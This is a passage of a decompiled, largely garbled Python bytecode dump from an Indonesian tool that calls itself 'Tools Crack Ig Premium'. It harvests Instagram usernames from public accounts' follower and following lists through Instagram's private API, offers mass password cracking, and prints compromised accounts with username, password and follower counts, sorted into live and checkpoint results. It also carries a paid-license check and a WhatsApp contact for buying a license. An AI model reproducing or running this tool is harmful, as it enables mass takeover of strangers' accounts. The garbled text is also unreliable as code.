] Pilih : r?   �r~   Z01u.   [white][[red]•[white]] Masukan jumlah targetz] Jumlah : u?   [white][[red]•[white]] Masukan nama ranfom untuk di searchingr   z] Masukan nama (z): �r�   Z02z$] Apakah anda ingin crack masal? y/tr>   r�   r�   �r?   zISI JANGAN KOSONG KENTOD!)r�   Z03u4     {P}[{M}•{P}] Apakah anda ingin crack masal? y/t )r�   Z04r   z [�>r=   z] Masukan nama file: z	result/%sz ] Total Result Akun Check Point r'   z9[!] Proses mengecek status akun. silahkan tunggu sebentarrG   r   z proses check selesai...)r�   Z05�-z"[>] Total result yang di temukan [r�   r�   r�   r�   r�   �+zCHACK POINTz:
  u   ├╴>z Username: z
  z Password: z Followers: z Following: z
                    g�������?z[>]z AKUN LIVE r2  r3  r4  z Mengikuti : z

                    )Z06r�   )$rR   r�   r�   r�   r�   r�   r6   r7   �intr	   r@   rC   rD   r�   r�   rY   r�   �masal�massal�mengi�mengr   �listdirr�   ri   rj   �
splitlines�CYr�   r5  rP   r�   rL   r�   r   r�   )r�   ru   r�   rE   rv   rQ   Zmasr*  rk   Zusr�pwdr�   ZxcZfolZfulr   r   r   r�   �  sZ   ,."��
 ,
 
"

�����������������������������������������������������

zinstagram.menuNr8  )�__name__�
__module__�__qualname__r�   rR   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r5  r�   r   r   r   r   r�   !  s    &
4X1r�   c                 C   s�   zt �d� ttd�� ttdt� dt� dt� dt� ���}W n   d}Y t	|�D ]5}|d7 }t
dt� dt� dt� dtt�� �� tdt� dt� dt� d	��}| �| j|�}| �| jd
|�}q*| �|� d S )Nr�   �6   [white][[red]•[white]] Target Harus Bersipat Publickr|   r;   r<   �] Masukan jumlah target: r   z] Total Id :r   �Ehttps://i.instagram.com/api/v1/friendships/%s/following/?count=100000)r�   ro   r6   r7   r<  r�   r�   r�   rB   r@   r	   rD   r�   r�   rY   r�   r�   �r�   r�   r�   rv   rU   �infor   r   r   r?  �  s   
($r?  c              	   C   sX   t td�� tdt� dt� dt� dt� ��}| �| j|�}| �| jd|�}| �	|� d S )NrH  r|   r;   r<   �] Username target : rJ  )
r6   r7   r�   r�   r�   r�   r�   rY   r�   r�   �r�   r�   rU   rL  r   r   r   r@  �  s
    r@  c              
   C   s�   zt �d� ttd�� ttdt� dt� dt� dt� ���}W n   d}Y t	|�D ]'}|d7 }t
d� tdt� dt� dt� d	��}| �| j|�}| �| jd
|�}q*| �|� d S )Nr�   uC   [white][[red]•[white]] Target harus bersifat publik jangan privatr|   r;   r<   rI  r   r?   r   �Ehttps://i.instagram.com/api/v1/friendships/%s/followers/?count=100000)r�   ro   r6   r7   r<  r�   r�   r�   rB   r@   r	   r�   rY   r�   r�   rK  r   r   r   r=  �  s   
(r=  c              	   C   sb   t �d� ttd�� tdt� dt� dt� dt� ��}| �| j	|�}| �
| j	d|�}| �|� d S )Nr�   u6   [white][[red]•[white]] Target Harus Bersipat Publik r|   r;   r<   rM  rO  )r�   ro   r6   r7   r�   r�   r�   r�   r�   rY   r�   r�   rN  r   r   r   r>  �  s   
 r>  )r�   r'  ru   r(  r)  r*  )r�   r�   r�   r�   r�   rC   )r~   r�   r�   r�   r�   r�   c                  C   s�   t �  d} t| dd�}t� �|� t�d� ttddd�� tdt	� d��}|d	v r/t
�  d S |d
v rAt�d� td� t
�  d S t�  d S )Nz)# HARAP MASUKAN LISENSI ANDA TERIMAKASIH rf   rg   r�   zW[01]. [blue]Masukkan Lisensi Kalo Anda Punya[/]
[02]. [red]Saya Ingin Beli Lisensi [/]�greenr>   zinput choice : r6  r7  zSxdg-open https://wa.me/6281221523195?text=assalamualaikum,+bang+me+Maut+buy+license)r8   rr   rs   r	   rA   r   �printsr   r�   rB   �tlisensir   r%   rP   )ry   rz   r�   r   r   r   �key  s   



rS  c                  C   sN   t �  d} t| dd�}t� �|� t�d� td�}tdd��|� t	�  d S )Nz%# HARAP MASUKKAN LISENSI ANDA DI SINIrf   rg   r�   z Enter License : �
apikey.txtr   )
r8   rr   rs   r	   rA   r   r�   ri   r*   r�   )ry   rz   Zlisenr   r   r   rR  #  s   

rR  c                  C   s�   zt d��� } t�| � W n   t�  Y t�� }|�dtd  ��� }|d d }|| krNt	�  d}t
|dd�}t� �|� t�d	� t�d
� t�  d S t�  d S )NrT  z�https://app.cryptolens.io/api/key/activate?token=WyIyMjQ4NTI2NiIsImJ0K21NeWFoUnpwS0c0cUhiK2FvOURvbkI4U0RuTTBkcmFOcEd3OCsiXQ==&ProductId=16035&Key=r   Z
licenseKeyrS  z# Lisensi Kamu Valid rP  rg   r�   r    )ri   rj   �lisensikuniro   rR  rM   r�   rN   rm   r8   rr   rs   r	   rA   r   r�   r�   )ZcekZses�resr�   ry   rz   r   r   r   r�   .  s"   



r�   c                   C   s    t d� t�  td� t�  d S )Nr?   z�Selamat Datang Di Tools Crack Ig Premium
Gunakan Tools Ini Sewajar Nya Dan
Dan Gunakan Dengan Bijak
Bila Tidak Di Gunakan Dengan Bijak Bukan Tanggung Jawab Kami
SELAMAT BERSENANG SENANG)r	   r#   r,   r�   r   r   r   r   �SelamatB  s   
rW  rH   z
[r�   r�   )�rm   rT   Zhmacr$  Zhashlibr�   r�   Zurllib.requestr"  �ImportErrorr�   rP   rM   Zbs4r   r(   r   rA   r�   �
subprocessZrichr%   r   Z
rich.tabler   �meZrich.consoler   rs   r   Zsop�concurrent.futuresr   Ztredr   ZgpZ
rich.panelr   r7   r	   r6   Zrich.markdownr
   rr   Zrich.columnsr   �col�parserZjedaZ	rich.treer   rQ  ZprinterZrich.progressr   r   r   r   r   Zconsoler1   �strftimer�   ZnyMnDZnyMxD�gmtimer#  Z	insta_logr�   r�   r   rN   rO   r&  ri   r*   r�   rj   rB  ZsockrC  ZMGrC   r�   r�   r�   r�   r�   r�   rB   r�   r�   Zsirr�   r�   r-  r+  �hh�uZkkr'  �pZBNZBBLZBPZBBZBKZBHZBMZBArl   r�   rn   r�   r�   r!  rx   rU  r�   r�   rk   Zuar#   r,   r4   r8   rF   r�   Zurllib_quote_plus�parse�
quote_plusrS   r{   r�   r�   r�   r?  r@  r=  r>  r%  ZkentodZkentod1Zkentod2ZkentoddZkentodd1Zkentodd2Zkentodd3Zkentodd4Zkentodd5Zkentodd6Zkentodd7Zkentodd8ZcrotrS  rR  r�   rW  rE  r�   r�   r   r   r   r   �<module>   sD   ��P

�����&#	


   5
$

�
�